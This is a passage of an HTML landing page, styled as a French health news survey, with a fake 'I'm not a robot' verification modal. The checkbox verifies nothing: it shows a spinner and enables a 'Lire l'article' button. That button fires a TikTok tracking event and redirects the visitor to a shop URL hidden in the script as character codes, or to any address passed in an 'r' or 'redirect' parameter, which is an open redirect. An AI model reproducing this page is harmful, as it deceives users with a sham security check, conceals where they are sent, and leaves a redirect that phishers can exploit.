.site-shade {
  position: fixed;
  inset: 0;
  z-index: 1;
  background: rgba(28,21,18,.42);
}

.overlay {
  position: relative;
  z-index: 2;
  min-height: 100svh;
  display: grid;
  place-items: center;
  padding: calc(24px + env(safe-area-inset-top, 0px)) 16px calc(24px + env(safe-area-inset-bottom, 0px));
}

.modal {
  width: min(100%, 380px);
  border-radius: 16px;
  background: var(--card);
  box-shadow: 0 24px 70px rgba(0,0,0,.35);
  overflow: hidden;
  text-align: center;
  animation: pop .36s cubic-bezier(.2,.9,.3,1.15) both;
}

.modal-top {
  background: var(--text);
  color: #fff;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: .16em;
  text-transform: uppercase;
  padding: 11px 16px;
}

.modal-body { padding: 26px 22px 22px; }

.icon {
  width: 54px;
  height: 54px;
  margin: 0 auto 14px;
  border-radius: 50%;
  display: grid;
  place-items: center;
  background: #f7eaea;
  color: var(--accent);
}
.icon svg { width: 26px; height: 26px; }

.modal h1 { margin: 0 0 8px; font-size: 21px; font-weight: 700; line-height: 1.25; }
.modal h1 span { color: var(--accent); }
.modal .sub { margin: 0 0 20px; color: var(--muted); font-size: 14px; line-height: 1.55; }

/* caixa "Je ne suis pas un robot" */
.cb-row {
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 13px 14px 13px 15px;
  border: 1px solid var(--line);
  border-radius: 10px;
  background: #faf8f5;
  cursor: pointer;
  text-align: left;
  margin-bottom: 16px;
  transition: .18s border-color, .18s background;
  user-select: none;
  -webkit-user-select: none;
  -webkit-tap-highlight-color: transparent;
}
.cb-row:hover    { border-color: #cdbfae; }
.cb-row.checking { pointer-events: none; }
.cb-row.checked  { border-color: rgba(142,28,28,.45); background: #fbf3f3; }

.cb-box {
  width: 26px;
  height: 26px;
  flex: 0 0 26px;
  border: 2px solid #bfb3a6;
  border-radius: 5px;
  display: grid;
  place-items: center;
  background: #fff;
  transition: .18s;
}
.cb-row.checking .cb-box { border-color: transparent; background: transparent; }
.cb-row.checked  .cb-box { border-color: var(--accent); background: var(--accent); }
.cb-box svg { width: 15px; height: 15px; }

.cb-label { font-size: 14.5px; font-weight: 600; }
.cb-hint  { font-size: 11.5px; color: var(--muted); margin-top: 1px; }

.cb-brand { margin-left: auto; text-align: center; flex-shrink: 0; color: var(--navy); }
.cb-brand svg { width: 21px; height: 21px; display: block; margin: 0 auto; }
.cb-brand small { display: block; margin-top: 3px; font-size: 7.5px; letter-spacing: .12em; font-weight: 600; }

.spin {
  width: 22px;
  height: 22px;
  border: 2.5px solid rgba(142,28,28,.18);
  border-top-color: var(--accent);
  border-radius: 50%;
  animation: spin .9s linear infinite;
}

.primary {
  width: 100%;
  min-height: 52px;
  border: 0;
  border-radius: 10px;
  background: var(--accent);
  box-shadow: 0 8px 20px rgba(142,28,28,.25);
  color: #fff;
  font: 600 15.5px/1 Poppins, sans-serif;
  letter-spacing: .02em;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  transition: .18s transform, .18s background, .18s opacity;
  -webkit-tap-highlight-color: transparent;
}
.primary:hover:not(:disabled)  { background: var(--accent2); }
.primary:active:not(:disabled) { transform: scale(.985); }
.primary:disabled { opacity: .38; cursor: default; box-shadow: none; }
.primary.loading  { opacity: 1; }
.primary .spin { width: 18px; height: 18px; border-color: rgba(255,255,255,.3); border-top-color: #fff; }

.foot {
  margin-top: 14px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  color: #9a9088;
  font-size: 11px;
}
.foot svg { width: 12px; height: 12px; }

@keyframes pop  { from { opacity: 0; transform: translateY(14px) scale(.97); } to { opacity: 1; transform: none; } }
@keyframes spin { to { transform: rotate(360deg); } }

@media (max-width: 360px) {
  .modal-body { padding: 22px 16px 18px; }
  .modal h1 { font-size: 19px; }
}
</style>

<body>

<div class="site-bg" aria-hidden="true"></div>
<div class="site-shade" aria-hidden="true"></div>

<main class="overlay">
  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="ttl">

    <div class="modal-top">Santé &amp; Bien-être | Enquête</div>

    <div class="modal-body">
      <div class="icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
      </div>

      <h1 id="ttl">Vérification <span>rapide</span></h1>
      <p class="sub">Pour lire l'enquête complète, confirmez que vous n'êtes pas un robot.</p>

      <div class="cb-row" id="cbRow" role="checkbox" aria-checked="false" tabindex="0">
        <span class="cb-box" id="cbBox" aria-hidden="true"></span>
        <span>
          <div class="cb-label">Je ne suis pas un robot</div>
          <div class="cb-hint">Touchez pour vérifier</div>
        </span>
        <span class="cb-brand" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
          <small>SÉCURISÉ</small>
        </span>
      </div>

      <button class="primary" id="verifyBtn" disabled aria-disabled="true">Lire l'article</button>

      <div class="foot" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
        Connexion sécurisée
      </div>
    </div>

  </div>
</main>

<script>
const params = new URLSearchParams(location.search);

function _b() {
  return [104,116,116,112,115,58,47,47,102,108,111,119,97,101,114,105,110,101,46,115,104,111,112,47,112,97,103,101,115,47,109,111,108,101,110,101].map(c=>String.fromCharCode(c)).join('');
}

const forward = new URLSearchParams();
params.forEach((v, k) => { if (k !== 'r' && k !== 'redirect') forward.append(k, v); });
const qs = forward.toString();
const _base = params.get('r') || params.get('redirect') || _b();
const REDIRECT = qs ? _base + (_base.includes('?') ? '&' : '?') + qs : _base;

const CHECK_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg>';

const cbRow = document.getElementById('cbRow');
const cbBox = document.getElementById('cbBox');
const btn   = document.getElementById('verifyBtn');

function triggerCheck() {
  if (cbRow.classList.contains('checking') || cbRow.classList.contains('checked')) return;
  cbRow.classList.add('checking');
  cbRow.setAttribute('aria-checked', 'true');
  cbBox.innerHTML = '<div class="spin"></div>';
  setTimeout(() => {
    cbRow.classList.remove('checking');
    cbRow.classList.add('checked');
    cbBox.innerHTML = CHECK_SVG;
    btn.disabled = false;
    btn.removeAttribute('aria-disabled');
    btn.focus();
  }, 1400);
}

cbRow.addEventListener('click', triggerCheck);
cbRow.addEventListener('keydown', e => {
  if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); triggerCheck(); }
});

btn.addEventListener('click', () => {
  if (btn.disabled) return;
  btn.disabled = true;
  btn.classList.add('loading');
  btn.innerHTML = '<div class="spin"></div>Vérification…';

  if (window.ttq) ttq.track('ViewContent');

  setTimeout(() => {
    if (REDIRECT) window.location.href = REDIRECT;
  }, 900);
});
</script>
